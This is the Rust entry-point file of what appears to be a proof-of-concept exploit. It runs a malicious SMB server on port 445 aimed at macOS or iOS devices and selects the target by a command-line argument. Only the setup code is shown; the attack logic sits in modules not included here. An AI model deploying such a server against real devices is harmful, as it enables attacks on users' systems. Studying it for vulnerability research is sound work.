mod common;
mod ios;
mod macos;

use std::net::TcpListener;

fn main() {
    // Get the target device (macOS or iOS) from the first argument.
    // Note: we don't need to know this ahead of time, the PoC could
    // be refactored to work for both targets without an argument.
    let ios = match std::env::args().nth(1) {
        Some(arg) if arg == "ios" => true,
        Some(arg) if arg == "macos" => false,
        _ => return println!("first argument must be 'ios' or 'macos'"),
    };

    // Bind on port 445 where the malicious SMB server listens for requests.
    let listener = TcpListener::bind("0.0.0.0:445").unwrap();
    println!("{listener:?}");

    // Run the PoC for the chosen target device.
    match ios {
        true => ios::run(listener),
        false => macos::run(listener),
    }
}
